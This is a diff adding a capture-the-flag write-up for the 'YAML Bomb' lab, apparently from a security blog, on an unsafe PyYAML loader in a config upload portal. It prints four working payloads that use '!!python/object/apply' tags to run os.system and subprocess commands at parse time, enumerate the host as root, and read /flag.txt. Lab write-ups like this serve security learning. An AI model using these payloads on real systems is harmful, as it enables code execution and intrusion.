@@ -218,3 +218,64 @@ The flag can then be retrieved from the corresponding password entry.
 **Flag:** Stored inside the vault entry (retrievable using the cracked password `PASSWORD`).
 
 ![Desktop View](/keepass2.png){: width="600" height="350" }
+
+---
+
+## YAML Bomb
+You can view the YAML Bomb Lab [here](https://hackerdna.com/labs/yaml-bomb).
+![Desktop View](/YAML1.png){: width="600" height="350" }
+
+---
+# Challenge Details
+
+**Challenge name :** YAML Bomb — Configuration Management Portal.
+**Service / App :** Configuration Processing Engine v2.1 — accepts .yaml / .yml uploads via a web UI
+**Supported formats :** YAML (.yaml, .yml)
+
+---
+
+# Summary
+A configuration management portal parsed user-supplied YAML using an **unsafe PyYAML loader** that honored Python constructor tags (`!!python/...`). By uploading crafted YAML payloads we achieved command execution at parse time, enumerated the runtime environment (the process ran as `root` and CWD `/app`).
+
+---
+
+# Payloads
+
+# 1) Detection — confirm code execution 
+```yaml
+application:
+  name: "MyApp"
+exploit: !!python/object/apply:os.system
+- "sh -c 'echo VULN > /tmp/pyyaml_vuln_test'"
+```
+---
+
+# 2) Enumeration — effective user and CWD
+```yaml
+application:
+  name: "MyApp"
+probe: !!python/object/apply:subprocess.getoutput
+- "id 2>&1 && echo '---' && pwd 2>&1"
+```
+---
+
+# 3) Directory listing — find flag candidates
+```yaml
+application:
+  name: "MyApp"
+probe: !!python/object/apply:subprocess.getoutput
+- |
+  sh -c 'ls -la / 2>&1 | sed -n "1,200p"'
+```
+---
+
+# 4) Read the flag — capture stdout/stderr robustly
+```yaml
+application:
+  name: "MyApp"
+probe: !!python/object/apply:subprocess.getoutput
+- "sh -c 'cat /flag.txt 2>&1 || true'"
+```
+**Processed output returned :** `{'application': {'name': 'MyApp'}, 'probe': 'FLAG'}`
+![Desktop View](/YAML2.png){: width="600" height="350" }
+
